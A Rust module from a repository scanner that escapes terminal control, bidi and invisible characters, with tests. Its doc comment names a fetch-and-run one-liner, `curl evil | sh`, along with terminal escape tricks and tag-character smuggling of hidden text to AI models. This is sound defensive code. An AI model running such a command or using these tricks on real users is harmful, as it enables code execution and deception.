//! Making repository-controlled text safe to put in front of a person.
//!
//! Everything onopen prints about a finding — the path, the trigger, the
//! command — was written by whoever authored the repository being inspected.
//! That is the one party a scanner cannot trust with the reader's terminal. A
//! command holding `ESC ] 52` can write to the clipboard of the person reading
//! the report; `ESC [ 2 K` plus a carriage return can erase the line that named
//! the finding and print a harmless one over it; an OSC 8 sequence can make
//! `npm test` link somewhere else; a right-to-left override can make
//! `curl evil | sh` read as something else entirely ("Trojan Source").
//!
//! So text from the repository goes through [`visible`] before it reaches a
//! terminal: control characters, bidirectional controls and invisible
//! characters come out as escapes a reader can see — `\x1b`, `\u{202e}` — and
//! are never passed through to be interpreted. Plain text, including every
//! printable non-ASCII character, comes through unchanged.
//!
//! JSON output is deliberately left alone. It is data for a program, `serde`
//! already escapes every control character there, and rewriting a path or a
//! command would make the report disagree with the file it describes. A
//! consumer that puts JSON strings in front of a person owns that step.

use std::borrow::Cow;
use std::fmt::Write as _;

/// `s` with every character that would be interpreted rather than read
/// replaced by a visible escape. Borrows when there is nothing to escape,
/// which is the ordinary case.
pub fn visible(s: &str) -> Cow<'_, str> {
    if !s.chars().any(needs_escape) {
        return Cow::Borrowed(s);
    }
    let mut out = String::with_capacity(s.len() + 16);
    for ch in s.chars() {
        match ch {
            '\t' => out.push_str(r"\t"),
            '\n' => out.push_str(r"\n"),
            '\r' => out.push_str(r"\r"),
            c if (c as u32) < 0x80 && needs_escape(c) => {
                let _ = write!(out, r"\x{:02x}", c as u32);
            }
            c if needs_escape(c) => {
                let _ = write!(out, r"\u{{{:x}}}", c as u32);
            }
            c => out.push(c),
        }
    }
    Cow::Owned(out)
}

/// Whether `c` changes how a terminal draws what follows it, or draws as
/// nothing at all.
fn needs_escape(c: char) -> bool {
    // C0, DEL and C1. C1 matters as much as ESC: U+009B is a single-character
    // CSI to terminals that honour 8-bit controls.
    c.is_control()
        || matches!(
            c,
            // Bidirectional formatting: marks, embeddings, overrides and isolates.
            '\u{061C}'
                | '\u{200E}'
                | '\u{200F}'
                | '\u{202A}'..='\u{202E}'
                | '\u{2066}'..='\u{2069}'
                // Zero-width and invisible characters that hide text or split a
                // word the eye reads as one.
                | '\u{00AD}'
                | '\u{180E}'
                | '\u{200B}'..='\u{200D}'
                | '\u{2060}'..='\u{2064}'
                | '\u{FEFF}'
                // Line and paragraph separators end a line in some terminals
                // and editors, which is how one finding becomes two.
                | '\u{2028}'
                | '\u{2029}'
                // Tag characters: invisible, and a known way to smuggle text
                // past a human to a model reading the same bytes.
                | '\u{E0000}'..='\u{E007F}'
        )
}

#[cfg(test)]
mod tests {
    use super::visible;

    #[test]
    fn plain_text_is_borrowed_unchanged() {
        let s = "node ./tools/setup.js — café 日本";
        assert!(matches!(visible(s), std::borrow::Cow::Borrowed(_)));
        assert_eq!(visible(s), s);
    }

    #[test]
    fn terminal_controls_come_out_as_visible_escapes() {
        assert_eq!(visible("a\x1b[2Kb"), r"a\x1b[2Kb");
        assert_eq!(visible("a\rb\nc\td"), r"a\rb\nc\td");
        assert_eq!(visible("\x07\x7f"), r"\x07\x7f");
        assert_eq!(visible("\u{9b}31m"), r"\u{9b}31m");
    }

    #[test]
    fn bidi_and_invisible_characters_are_named() {
        assert_eq!(visible("a\u{202E}b"), r"a\u{202e}b");
        assert_eq!(visible("\u{2066}x\u{2069}"), r"\u{2066}x\u{2069}");
        assert_eq!(visible("a\u{200B}b\u{FEFF}"), r"a\u{200b}b\u{feff}");
        assert_eq!(visible("\u{E0041}"), r"\u{e0041}");
    }
}
